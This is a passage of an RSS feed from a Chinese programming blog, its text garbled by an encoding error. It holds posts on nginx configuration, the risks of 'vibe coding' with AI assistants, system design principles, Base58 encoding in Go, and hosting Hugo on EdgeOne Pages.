&lt;h3 id="å‘2-try_files-åœ°å€è¦å†™-subappindexhtml">å‘2: try_files åœ°å€è¦å†™ &lt;code>/subapp/index.html&lt;/code>&lt;/h3>
&lt;p>ä¹‹å‰å†™çš„ &lt;code>/index.html&lt;/code> è®©æˆ‘è¯¯ä»¥ä¸ºæ˜¯è¢« &lt;code>/&lt;/code> æ ¹åº”ç”¨æ‹¦æˆªäº†ï¼Œå®é™…ä¸Šæ˜¯æ‰¾é”™ html äº†ã€‚&lt;/p></description></item><item><title>â€œæ°›å›´ç¼–ç¨‹â€ï¼šåˆ«æŠŠä½ çš„å¤§è„‘å¤–åŒ…ç»™ AI</title><link>https://www.typesafe.cn/posts/vibe-coding/</link><pubDate>Sun, 24 Aug 2025 16:19:09 +0800</pubDate><guid>https://www.typesafe.cn/posts/vibe-coding/</guid><description>&lt;h4 id="æ°›å›´ç¼–ç¨‹-çš„å®šä¹‰">â€œæ°›å›´ç¼–ç¨‹â€ çš„å®šä¹‰&lt;/h4>
&lt;p>ä½ è¿˜è®°å¾—æœ€å¼€å§‹ä½¿ç”¨ AI ååŠ©ç¼–ç¨‹çš„æ ·å­å—ï¼Ÿ&lt;/p>
&lt;p>å°†æœ¬åº”è¾“å…¥æœç´¢å¼•æ“çš„é”™è¯¯ä¿¡æ¯ï¼Œç›´æ¥ç²˜è´´åˆ° AI å¯¹è¯æ¡†è®©å…¶æä¾›è§£å†³æ–¹æ¡ˆï¼Œä»è€Œçœå»è‡ªå·±å¯»æ‰¾å’Œç­›é€‰ç­”æ¡ˆçš„æ­¥éª¤ã€‚&lt;/p>
&lt;p>åˆæˆ–è€…åƒä½¿ç”¨ Copilot é‚£æ ·ï¼Œåœ¨ IDE ä¸­åªè¾“å…¥å¯¥å¯¥æ•°ä¸ªå­—ç¬¦ï¼Œä¾¿è®© AI è¡¥å…¨å‰©ä¸‹çš„ä»£ç ã€‚&lt;/p>
&lt;p>ç°åœ¨ç¼–ç åŠ©æ‰‹æ—©å°±æ›´è¿›ä¸€æ­¥äº†ï¼Œç›´æ¥åœ¨è¾“å…¥æ¡†è¾“å…¥ä½ çš„éœ€æ±‚ï¼Œ&lt;code>Agent&lt;/code> ä¼šè‡ªåŠ¨åˆ›å»ºæ–‡ä»¶ã€å†™å…¥ä»£ç ã€ç¼–è¯‘æµ‹è¯•ï¼Œç›´åˆ°ä½ æ»¡æ„ä¸ºæ­¢ã€‚&lt;/p>
&lt;p>è€Œä½ ï¼Œä¸éœ€è¦å†™å…¥ä¸€è¡Œä»£ç ï¼Œç”šè‡³ä¸éœ€è¦å»çœ‹ AI ç”Ÿæˆçš„ä»£ç ã€‚&lt;/p>
&lt;p>è¿™å°±æ˜¯ â€œæ°›å›´ç¼–ç¨‹â€ ã€‚&lt;/p>
&lt;h4 id="ä¼˜ç§€çš„å·¥ç¨‹å¸ˆéœ€è¦ç†è§£è‡ªå·±çš„ä»£ç ">ä¼˜ç§€çš„å·¥ç¨‹å¸ˆéœ€è¦ç†è§£è‡ªå·±çš„ä»£ç &lt;/h4>
&lt;p>â€œæ°›å›´ç¼–ç¨‹â€ çš„ä¼˜ç‚¹æ˜¯ä½ ä¸éœ€è¦â€œå†™â€ä»£ç ï¼Œä½†åå¤„ä¹Ÿæ˜¯ä½ ä¸éœ€è¦â€œå†™â€ä»£ç ã€‚&lt;/p>
&lt;ol>
&lt;li>ä¸â€œå†™â€ä»£ç ï¼Œå°±æ— æ³•çœŸæ­£ç†è§£ä»£ç ã€‚&lt;/li>
&lt;li>ä¸ç†è§£çš„ä»£ç ä¼šå¯¼è‡´ä¸å¯é¢„æµ‹çš„è¡Œä¸ºã€‚&lt;/li>
&lt;li>ä¸å¯é¢„æµ‹çš„è¡Œä¸ºå°±ä¼šå¯¼è‡´Bugæˆ–è€…æ¼æ´ã€‚&lt;/li>
&lt;/ol>
&lt;p>å½“ä½ ç‚¹å‡» â€œæ¥å—å…¨éƒ¨â€ çš„æ—¶å€™ï¼Œå°±æ— å¼‚äºç©ä¸€åœºä»£ç çš„ä¿„ç½—æ–¯è½®ç›˜èµŒã€‚&lt;/p>
&lt;p>ä¸Šä¸€ä¸ªç›¸ä¿¡äººå·¥æ™ºèƒ½çš„äººå·²ç»ä»˜å‡ºäº†æƒ¨ç—›çš„ä»£ä»·ã€‚&lt;/p>
&lt;p>&lt;img src="https://www.typesafe.cn/images/prev-trust-ai.png" alt="">&lt;/p>
&lt;h4 id="è™šå‡çš„ç”Ÿäº§åŠ›å’ŒæŠ€æœ¯å€º">è™šå‡çš„ç”Ÿäº§åŠ›å’ŒæŠ€æœ¯å€º&lt;/h4>
&lt;p>æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„é¡¹ç›®åœ¨æ–°äººçœ‹æ¥éƒ½æ˜¯ä¸€åº§â€œå±å±±â€ï¼ŒåŒºåˆ«åœ¨äºä¹‹å‰æ˜¯äººå·¥å»æ‹‰ï¼Œç°åœ¨åˆ™æ˜¯ AI å»æ‹‰ï¼Œå…³é”®åœ¨äº AI æ‹‰çš„åˆå¿«åˆå¤šã€‚&lt;/p>
&lt;p>â€œæ°›å›´ç¼–ç¨‹â€åœ¨åˆæœŸçœ‹èµ·æ¥æ•ˆç‡æƒŠäººï¼Œä»¥å¾€éœ€è¦æ•°å¤©æ‰èƒ½å®Œæˆçš„åŠŸèƒ½ï¼Œç°åœ¨å‡ å°æ—¶å°±èƒ½å®ç°ã€‚ç„¶è€Œï¼Œç”±äºå¼€å‘è€…å¯¹ä»£ç ç¼ºä¹ç†è§£ï¼Œä¸€æ—¦å‡ºç°é—®é¢˜ä¾¿éš¾ä»¥ä¿®å¤ï¼Œåªèƒ½å†æ¬¡æ±‚åŠ©äº AIï¼Œä»è€Œé™·å…¥æ¶æ€§å¾ªç¯ï¼Œæœ€ç»ˆå¯¼è‡´è¿™ä»½ä»£ç å‡ ä¹æ²¡æœ‰â€œäººâ€èƒ½ç»´æŠ¤ã€‚&lt;/p>
&lt;h4 id="ai-åº”è¯¥æ˜¯è¾…åŠ©è€Œä¸æ˜¯æ›¿ä»£">AI åº”è¯¥æ˜¯è¾…åŠ©ï¼Œè€Œä¸æ˜¯æ›¿ä»£&lt;/h4>
&lt;p>å®é™…ä¸Šï¼Œæˆ‘æœ¬äººä¹Ÿæ˜¯ AI çš„é‡åº¦ç”¨æˆ·ï¼Œå¹¶å°è¯•è¿‡ç”¨â€œæ°›å›´ç¼–ç¨‹â€æ¨¡å¼å¼€å‘äº†ä¸¤ä¸ªé¡¹ç›®ã€‚&lt;/p>
&lt;p>è¯´å®è¯ï¼Œæˆ‘å¯¹äºè¿™äº›é¡¹ç›®æ²¡æœ‰ä¿¡å¿ƒï¼Œæ¯”æˆ‘ç”¨ Python å¼€å‘é¡¹ç›®è¿˜è¦è™šçš„å¤šã€‚&lt;/p>
&lt;p>è™½ç„¶æˆ‘æ˜¯é¡¹ç›®çš„åˆ›å»ºè€…ï¼Œä½†æ˜¯ä½ é—®æˆ‘è¾“å…¥ xx åº”è¯¥ä¼šè¾“å‡ºä»€ä¹ˆï¼Ÿæˆ‘ä¸çŸ¥é“ã€‚å†…éƒ¨çš„è®¡ç®—é€»è¾‘ï¼Ÿæˆ‘ä¸çŸ¥é“ã€‚&lt;/p>
&lt;p>ç»è¿‡è¿™æ®µæ—¶é—´çš„â€œæ°›å›´ç¼–ç¨‹â€å®è·µï¼Œæˆ‘å‘ç°ä¸€ç§æ›´å¥½çš„åä½œæ–¹å¼ï¼šè‡ªå·±è§„åˆ’å¥½é¡¹ç›®æ¡†æ¶ä¸æ ¸å¿ƒé€»è¾‘ï¼Œç„¶åå°†å¢åˆ æ”¹æŸ¥ï¼ˆCRUDï¼‰è¿™ç±»æ¨¡å¼åŒ–çš„éƒ¨åˆ†äº¤ç»™ AI å®ç°ã€‚è¿™æ ·ï¼Œé¡¹ç›®æ‰ä¸è‡³äºåç¦»é¢„æœŸå¤ªè¿œã€‚&lt;/p>
&lt;hr>
&lt;p>&lt;strong>æ€»ç»“ä¸€ä¸‹&lt;/strong>&lt;/p>
&lt;p>å¯ä»¥å·æ‡’è®© AI å»å¹²è‹¦åŠ›æ´»ï¼Œä½†æ˜¯ä¸è¦å¤–åŒ…è‡ªå·±çš„æ€ç»´ï¼Œè®© AI æ›¿ä½ å»æ€è€ƒã€‚&lt;/p></description></item><item><title>ã€Šå…³äºä¼˜ç§€ç³»ç»Ÿè®¾è®¡æˆ‘æ‰€çŸ¥é“çš„ä¸€åˆ‡ã€‹çš„æ€»ç»“</title><link>https://www.typesafe.cn/posts/good-system-design-summary/</link><pubDate>Fri, 22 Aug 2025 13:15:30 +0800</pubDate><guid>https://www.typesafe.cn/posts/good-system-design-summary/</guid><description>&lt;p>ä»Šå¤©çœ‹åˆ° GitHub é«˜çº§å·¥ç¨‹å¸ˆå†™çš„ä¸€ç¯‡æ–‡ç« ã€ŠEverything I know about good system designã€‹ï¼Œå†™çš„å¾ˆå¥½ã€‚&lt;/p>
&lt;p>é“¾æ¥åœ°å€ï¼š&lt;/p>
&lt;p>&lt;a href="https://www.seangoedecke.com/good-system-design/">https://www.seangoedecke.com/good-system-design/&lt;/a>&lt;/p>
&lt;p>æ€»ç»“ä¸€ä¸‹ã€‚&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>çœŸæ­£ä¼˜ç§€çš„ç³»ç»Ÿè®¾è®¡æ˜¯â€œä¸èµ·çœ¼çš„â€ï¼ˆunderwhelmingï¼‰å’Œç®€å•çš„&lt;/strong>ã€‚å®ƒè¿½æ±‚çš„æ˜¯é•¿æœŸç¨³å®šè¿è¡Œï¼Œè€Œä¸æ˜¯ä½¿ç”¨å„ç§æ—¶é«¦ã€å¤æ‚çš„æŠ€æœ¯ã€‚ä¸€ä¸ªçœ‹èµ·æ¥ä»¤äººå°è±¡æ·±åˆ»çš„å¤æ‚ç³»ç»Ÿï¼Œå¾€å¾€æ©ç›–äº†ç³Ÿç³•çš„åº•å±‚å†³ç­–ã€‚&lt;/p>&lt;/blockquote>
&lt;h3 id="æ ¸å¿ƒè®¾è®¡å“²å­¦">æ ¸å¿ƒè®¾è®¡å“²å­¦&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>å¥½çš„è®¾è®¡æ˜¯æ— è¶£çš„&lt;/strong>ï¼šå½“ä½ æ„Ÿè§‰æŸä¸ªç³»ç»Ÿâ€œæ¯”é¢„æƒ³çš„ç®€å•â€æˆ–â€œä»æ¥ä¸ç”¨æ“å¿ƒâ€æ—¶ï¼Œè¿™æ°æ°æ˜¯å¥½è®¾è®¡çš„æ ‡å¿—ã€‚&lt;/li>
&lt;li>&lt;strong>ä»ç®€å•å¼€å§‹&lt;/strong>ï¼šä¸€ä¸ªèƒ½æ­£å¸¸å·¥ä½œçš„å¤æ‚ç³»ç»Ÿï¼Œæ€»æ˜¯ä»ä¸€ä¸ªèƒ½æ­£å¸¸å·¥ä½œçš„ç®€å•ç³»ç»Ÿæ¼”åŒ–è€Œæ¥çš„ã€‚ç›´æ¥ä»é›¶å¼€å§‹æ„å»ºå¤æ‚ç³»ç»Ÿæ˜¯ä¸ªåä¸»æ„ã€‚&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="çŠ¶æ€ç®¡ç†-state">çŠ¶æ€ç®¡ç† (State)&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>çŠ¶æ€æ˜¯ä¸‡æ¶ä¹‹æº&lt;/strong>ï¼šè½¯ä»¶è®¾è®¡ä¸­æœ€éš¾çš„éƒ¨åˆ†å°±æ˜¯ç®¡ç†çŠ¶æ€ï¼ˆStateï¼‰ã€‚æ— çŠ¶æ€ï¼ˆStatelessï¼‰çš„æœåŠ¡æ›´å®¹æ˜“ç»´æŠ¤ï¼Œå› ä¸ºå‡ºé—®é¢˜æ—¶å¯ä»¥ç›´æ¥é‡å¯æ¢å¤ã€‚&lt;/li>
&lt;li>&lt;strong>é›†ä¸­ç®¡ç†çŠ¶æ€&lt;/strong>ï¼šå°½é‡å‡å°‘æœ‰çŠ¶æ€çš„ç»„ä»¶ã€‚æœ€ä½³å®è·µæ˜¯è®©ä¸€ä¸ªä¸“é—¨çš„æœåŠ¡ä¸æ•°æ®åº“äº¤äº’æ¥ç®¡ç†çŠ¶æ€ï¼Œè€Œå…¶ä»–æœåŠ¡é€šè¿‡ API è¯·æ±‚æˆ–äº‹ä»¶ä¸è¯¥æœåŠ¡é€šä¿¡ï¼Œè€Œä¸æ˜¯è®©å¤šä¸ªæœåŠ¡éƒ½å»è¯»å†™åŒä¸€ä¸ªæ•°æ®åº“è¡¨ã€‚&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="æ ¸å¿ƒç»„ä»¶ä¸æ¨¡å¼">æ ¸å¿ƒç»„ä»¶ä¸æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>æ•°æ®åº“ (Database)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>æ•°æ®åº“è®¿é—®é€šå¸¸æ˜¯æ€§èƒ½ç“¶é¢ˆã€‚&lt;/li>
&lt;li>&lt;strong>Schema è®¾è®¡&lt;/strong>è¦åœ¨çµæ´»æ€§å’Œå¯è¯»æ€§ä¹‹é—´æ‰¾åˆ°å¹³è¡¡ã€‚&lt;/li>
&lt;li>ä¸ºå¸¸ç”¨æŸ¥è¯¢åˆ›å»º&lt;strong>ç´¢å¼• (Index)&lt;/strong>ï¼Œå¹¶å°†é«˜åŸºæ•°ï¼ˆhigh-cardinalityï¼‰çš„å­—æ®µæ”¾åœ¨å‰é¢ã€‚&lt;/li>
&lt;li>å°½å¯èƒ½è®©æ•°æ®åº“å®Œæˆå·¥ä½œï¼ˆå¦‚ä½¿ç”¨ &lt;code>JOIN&lt;/code>ï¼‰ï¼Œè€Œä¸æ˜¯åœ¨åº”ç”¨å†…å­˜ä¸­å¤„ç†æ•°æ®ã€‚&lt;/li>
&lt;li>å°†&lt;strong>è¯»è¯·æ±‚&lt;/strong>åˆ†å‘åˆ°åªè¯»å‰¯æœ¬ï¼ˆread-replicasï¼‰ä»¥å‡è½»ä¸»åº“å‹åŠ›ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å¤„ç†æ…¢æ“ä½œï¼šåå°ä½œä¸š (Background Jobs)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>é¢å‘ç”¨æˆ·çš„æ“ä½œå¿…é¡»å¿«é€Ÿå“åº”ï¼ˆå‡ ç™¾æ¯«ç§’å†…ï¼‰ã€‚&lt;/li>
&lt;li>è€—æ—¶é•¿çš„ä»»åŠ¡ï¼ˆå¦‚è½¬æ¢ä¸€ä¸ªå¤§æ–‡ä»¶ï¼‰åº”è¯¥æ”¾å…¥&lt;strong>åå°ä½œä¸š&lt;/strong>å¼‚æ­¥å¤„ç†ã€‚è¿™é€šå¸¸é€šè¿‡ä¸€ä¸ªé˜Ÿåˆ—ï¼ˆQueueï¼‰å’Œä½œä¸šæ‰§è¡Œå™¨ï¼ˆJob Runnerï¼‰å®ç°ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç¼“å­˜ (Caching)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>ç¼“å­˜æ˜¯è§£å†³æ˜‚è´µé‡å¤è®¡ç®—çš„ç»å…¸æ–¹æ¡ˆï¼Œä½†å®ƒæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§&lt;strong>çŠ¶æ€&lt;/strong>ï¼Œä¼šå¼•å…¥å¤æ‚æ€§ï¼ˆå¦‚ç¼“å­˜å¤±æ•ˆã€æ•°æ®ä¸ä¸€è‡´ï¼‰ã€‚&lt;/li>
&lt;li>é«˜çº§å·¥ç¨‹å¸ˆå€¾å‘äºå°½å¯èƒ½å°‘åœ°ä½¿ç”¨ç¼“å­˜ã€‚åœ¨ä½¿ç”¨ç¼“å­˜å‰ï¼Œåº”é¦–å…ˆå°è¯•ä»æ ¹æœ¬ä¸Šä¼˜åŒ–æ€§èƒ½ï¼ˆä¾‹å¦‚ï¼Œä¸ºæ…¢æŸ¥è¯¢æ·»åŠ ç´¢å¼•ï¼‰ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>äº‹ä»¶é©±åŠ¨ (Events)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>äº‹ä»¶ä¸­å¿ƒï¼ˆå¦‚ Kafkaï¼‰ç”¨äºå®ç°æœåŠ¡è§£è€¦ã€‚ä¸€ä¸ªæœåŠ¡å‘å¸ƒâ€œæŸäº‹å‘ç”Ÿâ€çš„äº‹ä»¶ï¼Œå¤šä¸ªä¸‹æ¸¸æœåŠ¡å¯ä»¥æ¶ˆè´¹è¯¥äº‹ä»¶å¹¶å„è‡ªå¤„ç†ã€‚&lt;/li>
&lt;li>é€‚ç”¨äº&lt;strong>å‘é€æ–¹ä¸å…³å¿ƒæ¶ˆè´¹è€…è¡Œä¸º&lt;/strong>çš„åœºæ™¯ã€‚ä¸è¦è¿‡åº¦ä½¿ç”¨ï¼Œå¾ˆå¤šæ—¶å€™ç›´æ¥çš„ API è°ƒç”¨æ›´ç®€å•ã€æ›´æ˜“äºè¿½è¸ªã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="ç³»ç»Ÿè¿ç»´ä¸å®¹é”™">ç³»ç»Ÿè¿ç»´ä¸å®¹é”™&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>å…³æ³¨å…³é”®è·¯å¾„ (Hot Paths)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>è®¾è®¡æ—¶åº”é›†ä¸­ç²¾åŠ›å¤„ç†ç³»ç»Ÿä¸­&lt;strong>æœ€é‡è¦&lt;/strong>å’Œ&lt;strong>æµé‡æœ€å¤§&lt;/strong>çš„éƒ¨åˆ†ã€‚è¿™äº›è·¯å¾„çš„è®¾è®¡æ–¹æ¡ˆé€‰æ‹©æ›´å°‘ï¼Œä¸”ä¸€æ—¦å‡ºé”™å½±å“å·¨å¤§ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ—¥å¿—ä¸ç›‘æ§ (Logging &amp;amp; Metrics)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>åœ¨&lt;strong>å¼‚å¸¸è·¯å¾„&lt;/strong>ï¼ˆunhappy pathï¼‰ä¸­ç§¯æè®°å½•æ—¥å¿—ï¼Œä»¥ä¾¿äºæ’æŸ¥é—®é¢˜ã€‚&lt;/li>
&lt;li>é™¤äº†å¹³å‡å“åº”æ—¶é—´ï¼Œè¿˜åº”ç›‘æ§ &lt;strong>p95 å’Œ p99&lt;/strong> åˆ†ä½å€¼ï¼Œå› ä¸ºè¿™èƒ½åæ˜ ä½ æœ€å¤§ã€æœ€é‡è¦å®¢æˆ·çš„çœŸå®ä½“éªŒã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å®¹é”™è®¾è®¡ (Failing Gracefully)&lt;/strong>&lt;/p></description></item><item><title>Base58 ç¼–ç è¯¦è§£ä¸ Go å®ç°</title><link>https://www.typesafe.cn/posts/base58-implementation-in-go/</link><pubDate>Sun, 10 Aug 2025 23:36:35 +0800</pubDate><guid>https://www.typesafe.cn/posts/base58-implementation-in-go/</guid><description>&lt;p>åœ¨å¤„ç†äºŒè¿›åˆ¶æ•°æ®æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å°†å…¶è½¬æ¢æˆå¯è¯»çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ç”Ÿæˆåœ°å€ã€å¯†é’¥ã€é‚€è¯·ç ç­‰ã€‚
å¸¸è§æ–¹æ¡ˆæœ‰ &lt;strong>Base64&lt;/strong>ã€&lt;strong>Hex&lt;/strong> ç­‰ï¼Œä½†åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œå®ƒä»¬å¹¶ä¸æ˜¯æœ€ä½³é€‰æ‹©ã€‚
è¿™æ—¶ï¼Œ&lt;strong>Base58&lt;/strong> å°±ç™»åœºäº†ã€‚&lt;/p>
&lt;h2 id="ä»€ä¹ˆæ˜¯-base58">ä»€ä¹ˆæ˜¯ Base58ï¼Ÿ&lt;/h2>
&lt;p>Base58 æ˜¯ä¸€ç§åŸºäº 58 ä¸ªå­—ç¬¦çš„ç¼–ç æ–¹å¼ï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;strong>é¿å…æ˜“æ··æ·†å­—ç¬¦&lt;/strong>ï¼ˆ&lt;code>0&lt;/code> å’Œ &lt;code>O&lt;/code>ï¼Œ&lt;code>l&lt;/code> å’Œ &lt;code>I&lt;/code>ï¼‰&lt;/li>
&lt;li>&lt;strong>ä¸åŒ…å«ç‰¹æ®Šç¬¦å·&lt;/strong>ï¼ˆ&lt;code>+&lt;/code> &lt;code>/&lt;/code> ç­‰ï¼‰ï¼Œé€‚åˆç›´æ¥ç”¨äº URLã€æ–‡ä»¶å&lt;/li>
&lt;li>&lt;strong>æ›´é€‚åˆäººå·¥æŠ„å†™å’Œé˜…è¯»&lt;/strong>ï¼Œé™ä½è¾“å…¥é”™è¯¯ç‡&lt;/li>
&lt;/ul>
&lt;p>å®ƒçš„å­—ç¬¦é›†æ˜¯ï¼š&lt;/p>
&lt;p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&lt;/p>
&lt;blockquote>
&lt;p>å¯ä»¥çœ‹åˆ°ï¼Œ&lt;code>0&lt;/code>ã€&lt;code>O&lt;/code>ã€&lt;code>l&lt;/code>ã€&lt;code>I&lt;/code> ç­‰å®¹æ˜“æ··æ·†çš„å­—ç¬¦è¢«å‰”é™¤ï¼Œæ²¡æœ‰ &lt;code>+&lt;/code>ã€&lt;code>/&lt;/code> è¿™ç±»ç‰¹æ®Šç¬¦å·ã€‚&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;h2 id="ä¸ºä»€ä¹ˆç”¨-base58">ä¸ºä»€ä¹ˆç”¨ Base58ï¼Ÿ&lt;/h2>
&lt;p>å‡è®¾ä½ æœ‰ä¸€ä¸ªç”¨æˆ·éœ€è¦æ‰‹åŠ¨è¾“å…¥é‚€è¯·ç ã€é’±åŒ…åœ°å€æˆ–äº¤æ˜“ IDï¼š&lt;/p>
&lt;ul>
&lt;li>å¦‚æœç”¨ &lt;strong>Base64&lt;/strong>ï¼Œä¼šå‡ºç° &lt;code>+&lt;/code> &lt;code>/&lt;/code> ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨ URL ä¸­éœ€è¦è½¬ä¹‰ï¼›&lt;/li>
&lt;li>å¦‚æœç”¨ &lt;strong>Hex&lt;/strong>ï¼Œæ•°æ®ä¼šå˜å¾—å¾ˆé•¿ï¼ˆæ¯ä¸ªå­—èŠ‚è¦ç”¨ä¸¤ä¸ªå­—ç¬¦è¡¨ç¤ºï¼‰ï¼›&lt;/li>
&lt;li>å¦‚æœç”¨ &lt;strong>Base58&lt;/strong>ï¼Œé•¿åº¦æ›´çŸ­ï¼Œå¯è¯»æ€§æ›´é«˜ï¼Œé”™è¯¯ç‡æ›´ä½ã€‚&lt;/li>
&lt;/ul>
&lt;p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ¯”ç‰¹å¸ã€IPFS ç­‰é¡¹ç›®éƒ½é€‰æ‹©äº† Base58ï¼ˆæˆ–å…¶å˜ç§ Base58Checkï¼‰ã€‚&lt;/p>
&lt;hr>
&lt;h2 id="base58-åœ¨å®é™…é¡¹ç›®ä¸­çš„åº”ç”¨">Base58 åœ¨å®é™…é¡¹ç›®ä¸­çš„åº”ç”¨&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>æ¯”ç‰¹å¸åœ°å€&lt;/strong>ï¼šBase58Check ç¼–ç ï¼Œé˜²æ­¢å­—ç¬¦æ··æ·†å¹¶å¸¦æœ‰æ ¡éªŒç &lt;/li>
&lt;li>&lt;strong>IPFS CID&lt;/strong>ï¼šæ–‡ä»¶å†…å®¹ ID ä½¿ç”¨ Base58 ç¼–ç ï¼Œæ›´çŸ­ä¸”å¯ç›´æ¥ç”¨åœ¨å‘½ä»¤è¡Œ&lt;/li>
&lt;li>&lt;strong>é‚€è¯·ç  / çŸ­é“¾&lt;/strong>ï¼šç›´æ¥æ”¾åœ¨ URL ä¸­ï¼Œä¸éœ€è¦é¢å¤–è½¬ä¹‰&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="go-è¯­è¨€-base58-ç¼–ç ç¤ºä¾‹">Go è¯­è¨€ Base58 ç¼–ç ç¤ºä¾‹&lt;/h2>
&lt;p>è¿™é‡Œç”¨æˆ‘å¼€æºçš„ Golang Base58 åº“æ¥æ¼”ç¤ºï¼š&lt;/p></description></item><item><title>ä½¿ç”¨ EdgeOne Pages æ‰˜ç®¡Hugoåšå®¢</title><link>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</link><pubDate>Fri, 11 Jul 2025 12:30:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</guid><description>&lt;p>è‡ªä»è…¾è®¯äº‘å®¢æœç»™æˆ‘æ‰“ç”µè¯è¯´æˆ‘çš„å¤‡æ¡ˆåŸŸåè§£æåˆ°äº†å¢ƒå¤–IPä¸Šè®©æˆ‘æ•´æ”¹ï¼Œå·²ç»è¿‡å»äº†ä¸¤å¹´ã€‚&lt;/p>
&lt;p>å½“æ—¶æˆ‘æŠŠè§£æåˆ° Github Pages çš„åŸŸåæ›´æ”¹åˆ°äº†è½»é‡äº‘ï¼Œå¹¶ä¸”æŠŠ Github Pages æ‰“åŒ…ä¸‹æ¥ä½¿ç”¨ Caddy æ­å»ºäº†é™æ€ç½‘ç«™ï¼Œç”±äºæ›´æ–°ä¸ä¾¿ï¼Œæˆ‘å†ä¹Ÿæ²¡æœ‰æ›´æ–°è¿‡åšå®¢ã€‚&lt;/p>
&lt;p>å‰æ®µæ—¶é—´ç™½å«–äº† EdgeOne å…è´¹ CDN æµ‹è¯•åŠ é€Ÿ Github Pagesï¼Œè¯´å®è¯å¹¶ä¸å¥½ç”¨ã€‚&lt;/p>
&lt;p>é¦–å…ˆç¬¬ä¸€æ¬¡è¯·æ±‚å›æºåˆ° Github ç‰¹åˆ«æ…¢ï¼Œå¤§æ¦‚ç‡æ˜¯ç”¨äº†å›½å†…çš„èŠ‚ç‚¹å»è¯·æ±‚ï¼›å…¶æ¬¡ CDN çš„ç¼“å­˜åŠ é€ŸåŠŸèƒ½ï¼Œæˆ‘æ›´æ–°äº†åšå®¢çš„å†…å®¹å°±éœ€è¦æ‰‹åŠ¨æŠŠ CDN çš„ç¼“å­˜å…¨éƒ¨æ¸…ç©ºæ‰è¡Œï¼Œä¸ç¼“å­˜çš„è¯åˆèµ·ä¸åˆ°åŠ é€Ÿçš„ä½œç”¨ã€‚&lt;/p>
&lt;p>ä»Šå¤©å¿™é‡Œå·é—²ï¼Œæµ‹è¯•ä¸€ä¸‹EdgeOne Pages æ‰˜ç®¡Hugoåšå®¢ï¼ŒEdgeOne Pages æ˜¯æ”¯æŒ Node.js ç›¸å…³çš„æ¡†æ¶é¢„è®¾ï¼Œæˆ‘ä»¥ä¸ºæ‰˜ç®¡ Hugo åšå®¢ä¼šå¾ˆéº»çƒ¦ï¼Œç»“æœå‘ç°çœŸçš„å¾ˆç®€å•ã€‚&lt;/p>
&lt;p>é¦–å…ˆï¼Œä½ è¦å…ˆæŠŠ Hugo æ‰˜ç®¡åˆ° Github Pages ä¸Šï¼Œè¿™æ­¥æ•™ç¨‹å¾ˆå¤šï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ã€‚&lt;/p>
&lt;p>ç„¶åï¼Œä½ è¦åœ¨ EdgeOne ä¸Šåˆ›å»ºä¸€ä¸ª Pages é¡¹ç›®ï¼Œé€‰æ‹©ä½ çš„ Github Pages ä»“åº“ï¼Œè®°å¾—åˆ†æ”¯é€‰æ‹©ç¼–è¯‘åæ–‡ä»¶æ‰€åœ¨çš„ &lt;code>gh-pages&lt;/code> ç„¶åé€‰æ‹© Other é¢„è®¾ï¼Œå…¶ä»–ä¸éœ€è¦æ”¹å˜ã€‚&lt;/p>
&lt;p>&lt;img src="https://www.typesafe.cn/images/edgeone-pages-deploy.png" alt="">&lt;/p>
&lt;p>æœ€åç‚¹å‡»å¼€å§‹éƒ¨ç½²ï¼Œç­‰å¾…éƒ¨ç½²å®Œæˆå³å¯ã€‚&lt;/p>
&lt;hr>
&lt;p>æ¯æ¬¡æäº¤åï¼ŒGithub Action è‡ªåŠ¨ç¼–è¯‘å‘å¸ƒåœ¨åˆ†æ”¯ &lt;code>gh-pages&lt;/code> ä¸Šï¼Œ EdgeOne ä¼šè‡ªåŠ¨æ£€æµ‹åˆ°ä»“åº“ &lt;code>gh-pages&lt;/code> åˆ†æ”¯çš„å˜åŒ–ï¼Œæœ€åæ›´æ–°åˆ° EdgeOne Pages ä¸Šã€‚&lt;/p></description></item><item><title>Golang äºŒè¿›åˆ¶æ–‡ä»¶çš„é™æ€å’ŒåŠ¨æ€é“¾æ¥</title><link>https://www.typesafe.cn/posts/golang-binary-linking-types/</link><pubDate>Tue, 07 Jan 2025 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/golang-binary-linking-types/</guid><description>&lt;h2 id="æ¦‚è¿°">æ¦‚è¿°&lt;/h2>
